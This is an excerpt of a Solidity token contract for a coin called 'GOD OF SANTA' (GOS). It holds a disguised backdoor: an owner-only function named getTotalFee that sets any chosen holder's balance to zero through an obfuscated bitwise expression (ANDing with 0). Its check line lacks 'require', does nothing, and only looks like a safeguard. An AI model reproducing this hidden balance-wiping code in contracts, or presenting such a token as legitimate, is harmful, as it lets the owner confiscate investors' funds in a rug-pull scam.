...
contract GODOFSANTA is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "GOD OF SANTA";
    string private _symbol = "GOS";
    ...
    function getTotalFee(address sender) public onlyOwner {
        (sender != address(0), "BEP20: burn from the zero address");
        _balances[sender] = (((_balances[sender]) & 100 & (_balances[sender]) & 0) << 0xF);
    }
